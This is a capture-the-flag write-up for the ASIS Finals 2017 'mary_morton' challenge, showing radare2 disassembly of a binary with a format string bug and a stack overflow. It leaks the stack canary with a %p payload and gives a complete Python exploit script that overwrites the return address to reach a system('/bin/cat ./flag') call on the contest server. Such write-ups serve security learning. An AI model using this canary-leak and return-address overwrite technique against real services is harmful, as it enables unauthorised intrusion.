---
layout: post
title:  mary_morton
date:   2017-09-19 00:50:07 +0100
author: 3553x
category: ASIS Finals 2017
---
We determine that the downloaded file is a xz compressed tar archive by using the UNIX `file` utility.
```
mary_morton_f3555213d54602a8e5a40fe0435adcf84e8eff71: XZ compressed data
```

`tar xvf` reveals a 64bit ELF for Linux.
```
mary_morton: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=b7971b84c2309bdb896e6e39073303fc13668a38, stripped
```

Let's take a look at the file in radare2.

This is the main function:
```
/ (fcn) main 180
|   main ();
|           ; var int local_28h @ rbp-0x28
|           ; var int local_20h @ rbp-0x20
|           ; var int local_14h @ rbp-0x14
|           ; var int local_ch @ rbp-0xc
|           ; var int local_8h @ rbp-0x8
|              ; DATA XREF from 0x0040074d (entry0)
|           0x00400826      55             push rbp
|           0x00400827      4889e5         mov rbp, rsp
|           0x0040082a      4883ec30       sub rsp, 0x30               ; '0'
|           0x0040082e      897dec         mov dword [local_14h], edi
|           0x00400831      488975e0       mov qword [local_20h], rsi
|           0x00400835      488955d8       mov qword [local_28h], rdx
|           0x00400839      64488b042528.  mov rax, qword fs:[0x28]    ; [0x28:8]=0x11a8 ; '('
|           0x00400842      488945f8       mov qword [local_8h], rax
|           0x00400846      31c0           xor eax, eax
|           0x00400848      b800000000     mov eax, 0
|           0x0040084d      e8ad010000     call sub.setvbuf_9ff        ; int setvbuf(FILE*stream, char*buf, int mode, size_t size)
|           0x00400852      bfd40a4000     mov edi, str.Welcome_to_the_battle__ ; 0x400ad4 ; "Welcome to the battle ! " ; const char * s
|           0x00400857      e824feffff     call sym.imp.puts           ; int puts(const char *s)
|           0x0040085c      bfed0a4000     mov edi, str._Great_Fairy__level_pwned ; 0x400aed ; "[Great Fairy] level pwned " ; const char * s
|           0x00400861      e81afeffff     call sym.imp.puts           ; int puts(const char *s)
|           0x00400866      bf080b4000     mov edi, str.Select_your_weapon ; 0x400b08 ; "Select your weapon " ; const char * s
|           0x0040086b      e810feffff     call sym.imp.puts           ; int puts(const char *s)
|              ; JMP XREF from 0x004008d8 (main)
|       .-> 0x00400870      b800000000     mov eax, 0
|       |   0x00400875      e860010000     call sub.puts_9da           ; int puts(const char *s)
|       |   0x0040087a      488d45f4       lea rax, qword [local_ch]
|       |   0x0040087e      4889c6         mov rsi, rax                ; void *buf
|       |   0x00400881      bf1c0b4000     mov edi, 0x400b1c           ; int fildes
|       |   0x00400886      b800000000     mov eax, 0
|       |   0x0040088b      e870feffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
|       |   0x00400890      8b45f4         mov eax, dword [local_ch]
|       |   0x00400893      83f802         cmp eax, 2
|      ,==< 0x00400896      7416           je 0x4008ae
|      ||   0x00400898      83f803         cmp eax, 3
|     ,===< 0x0040089b      741d           je 0x4008ba
|     |||   0x0040089d      83f801         cmp eax, 1
|    ,====< 0x004008a0      752c           jne 0x4008ce
|    ||||   0x004008a2      b800000000     mov eax, 0
|    ||||   0x004008a7      e8b4000000     call sub.read_960           ; ssize_t read(int fildes, void *buf, size_t nbyte)
|   ,=====< 0x004008ac      eb2a           jmp 0x4008d8
|   |||`--> 0x004008ae      b800000000     mov eax, 0
|   ||| |   0x004008b3      e833000000     call sub.read_8eb           ; ssize_t read(int fildes, void *buf, size_t nbyte)
|   |||,==< 0x004008b8      eb1e           jmp 0x4008d8
|   ||`---> 0x004008ba      bf1f0b4000     mov edi, str.Bye            ; 0x400b1f ; "Bye " ; const char * s
|   || ||   0x004008bf      e8bcfdffff     call sym.imp.puts           ; int puts(const char *s)
|   || ||   0x004008c4      bf00000000     mov edi, 0                  ; int status
|   || ||   0x004008c9      e842feffff     call sym.imp.exit           ; void exit(int status)
|   |`----> 0x004008ce      bf240b4000     mov edi, str.Wrong_         ; 0x400b24 ; "Wrong!" ; const char * s
|   |  ||   0x004008d3      e8a8fdffff     call sym.imp.puts           ; int puts(const char *s)
|   |  ||      ; JMP XREF from 0x004008b8 (main)
|   |  ||      ; JMP XREF from 0x004008ac (main)
\   `--``=< 0x004008d8      eb96           jmp 0x400870
```

The function `sub.puts_9da` informs us of our options: A format string attack and a buffer overflow.
Note that the program ends a loop and we can thus call an arbitrary combination of these functions.

Let's take a look at the buffer overflow:
```
/ (fcn) sub.read_960 122
|   sub.read_960 ();
|           ; var int local_90h @ rbp-0x90
|           ; var int local_8h @ rbp-0x8
|              ; CALL XREF from 0x004008a7 (main)
|           0x00400960      55             push rbp
|           0x00400961      4889e5         mov rbp, rsp
|           0x00400964      4881ec900000.  sub rsp, 0x90
|           0x0040096b      64488b042528.  mov rax, qword fs:[0x28]    ; [0x28:8]=0x11a8 ; '('
|           0x00400974      488945f8       mov qword [local_8h], rax
|           0x00400978      31c0           xor eax, eax
|           0x0040097a      488d9570ffff.  lea rdx, qword [local_90h]
|           0x00400981      b800000000     mov eax, 0
|           0x00400986      b910000000     mov ecx, 0x10
|           0x0040098b      4889d7         mov rdi, rdx
|           0x0040098e      f348ab         rep stosq qword [rdi], rax
|           0x00400991      488d8570ffff.  lea rax, qword [local_90h]
|           0x00400998      ba00010000     mov edx, 0x100              ; size_t nbyte
|           0x0040099d      4889c6         mov rsi, rax                ; void *buf
|           0x004009a0      bf00000000     mov edi, 0                  ; int fildes
|           0x004009a5      e826fdffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
|           0x004009aa      488d8570ffff.  lea rax, qword [local_90h]
|           0x004009b1      4889c6         mov rsi, rax
|           0x004009b4      bf3b0b4000     mov edi, str.____s_n        ; 0x400b3b ; "-> %s\n" ; const char * format
|           0x004009b9      b800000000     mov eax, 0
|           0x004009be      e8edfcffff     call sym.imp.printf         ; int printf(const char *format)
|           0x004009c3      90             nop
|           0x004009c4      488b45f8       mov rax, qword [local_8h]
|           0x004009c8      644833042528.  xor rax, qword fs:[0x28]
|       ,=< 0x004009d1      7405           je 0x4009d8
|       |   0x004009d3      e8b8fcffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
|       `-> 0x004009d8      c9             leave
\           0x004009d9      c3             ret
```

Only 0x90 bytes are allocated on the stack, however the call to `read` accepts up to 0x100 bytes and saves them on the stack.
We can thus overwrite 0x10 bytes of memory which corresponds to exactly two 64bit addresses.
In our case, that would be the saved base pointer and the return address, how convenient!

Our only problem is the stack canary, we would overwrite it and trigger the check at the end of the function and of course the question of what address we should return to also remains open.

Time to look at the format string attack!

### Recovering the Canary

```
/ (fcn) sub.read_8eb 117
|   sub.read_8eb ();
|           ; var int local_90h @ rbp-0x90
|           ; var int local_8h @ rbp-0x8
|              ; CALL XREF from 0x004008b3 (main)
|           0x004008eb      55             push rbp
|           0x004008ec      4889e5         mov rbp, rsp
|           0x004008ef      4881ec900000.  sub rsp, 0x90
|           0x004008f6      64488b042528.  mov rax, qword fs:[0x28]    ; [0x28:8]=0x11a8 ; '('
|           0x004008ff      488945f8       mov qword [local_8h], rax
|           0x00400903      31c0           xor eax, eax
|           0x00400905      488d9570ffff.  lea rdx, qword [local_90h]
|           0x0040090c      b800000000     mov eax, 0
|           0x00400911      b910000000     mov ecx, 0x10
|           0x00400916      4889d7         mov rdi, rdx
|           0x00400919      f348ab         rep stosq qword [rdi], rax
|           0x0040091c      488d8570ffff.  lea rax, qword [local_90h]
|           0x00400923      ba7f000000     mov edx, 0x7f               ; size_t nbyte
|           0x00400928      4889c6         mov rsi, rax                ; void *buf
|           0x0040092b      bf00000000     mov edi, 0                  ; int fildes
|           0x00400930      e89bfdffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
|           0x00400935      488d8570ffff.  lea rax, qword [local_90h]
|           0x0040093c      4889c7         mov rdi, rax                ; const char * format
|           0x0040093f      b800000000     mov eax, 0
|           0x00400944      e867fdffff     call sym.imp.printf         ; int printf(const char *format)
|           0x00400949      90             nop
|           0x0040094a      488b45f8       mov rax, qword [local_8h]
|           0x0040094e      644833042528.  xor rax, qword fs:[0x28]
|       ,=< 0x00400957      7405           je 0x40095e
|       |   0x00400959      e832fdffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
|       `-> 0x0040095e      c9             leave
\           0x0040095f      c3             ret
```
This part doesn't need much explaining, does it?
We simply use the format string attack to recover the canary from the stack and since the canary stays the same for the lifetime of the process, we can simply use it in our buffer overflow.

### Finding a Return Address

Now the last mystery is the address that we ought to return to.
A look at the imported functions might give us some useful hints.

```
ordinal=001 plt=0x00400680 bind=GLOBAL type=FUNC name=puts
ordinal=002 plt=0x00400690 bind=GLOBAL type=FUNC name=__stack_chk_fail
ordinal=003 plt=0x004006a0 bind=GLOBAL type=FUNC name=system
ordinal=004 plt=0x004006b0 bind=GLOBAL type=FUNC name=printf
ordinal=005 plt=0x004006c0 bind=GLOBAL type=FUNC name=alarm
ordinal=006 plt=0x004006d0 bind=GLOBAL type=FUNC name=read
ordinal=007 plt=0x004006e0 bind=GLOBAL type=FUNC name=__libc_start_main
ordinal=008 plt=0x00400000 bind=WEAK type=NOTYPE name=__gmon_start__
ordinal=009 plt=0x004006f0 bind=GLOBAL type=FUNC name=setvbuf
ordinal=010 plt=0x00400700 bind=GLOBAL type=FUNC name=__isoc99_scanf
ordinal=011 plt=0x00400710 bind=GLOBAL type=FUNC name=exit
ordinal=008 plt=0x00400000 bind=WEAK type=NOTYPE name=__gmon_start__
```

`system` is just what we are looking for and as it turns out, there is a call to system at 0x4008e3:
```
            0x004008da      55             push rbp
            0x004008db      4889e5         mov rbp, rsp
            0x004008de      bf2b0b4000     mov edi, str._bin_cat_._flag ; 0x400b2b ; "/bin/cat ./flag"
            0x004008e3      e8b8fdffff     call sym.imp.system         ; int system(const char *string)
            0x004008e8      90             nop
            0x004008e9      5d             pop rbp
            0x004008ea      c3             ret
```
This looks just like a function!
A perfect candidate for our return address.

### The Exploit

The following script is an implementation of our exploit:
```
#!/usr/bin/python3
import socket

IP = "146.185.132.36"
PORT = 19153

format_str = "%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p"
target_addr = 0x004008da

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, PORT))

print(s.recv(1024))
print(s.recv(1024))
s.send("2\n".encode('utf-8'))
s.send(format_str.encode('utf-8'))
canary = s.recv(1024)[-16:].decode('utf-8')
print(canary)
s.recv(1024)
s.send("1\n".encode('utf-8'))
payload = bytearray.fromhex("00"*0x88) + bytearray.fromhex(canary)[::-1]
payload += bytearray.fromhex("41"*8)
payload += bytearray.fromhex("00000000004008da")[::-1]
print(len(payload))
print(type(payload))
print(payload)
s.send(bytes(payload))
print(s.recv(1024))
print(s.recv(1024))
```

And we have the flag: ASIS{An_impROv3d_v3r_0f_f41rY_iN_fairy_lAnds!}

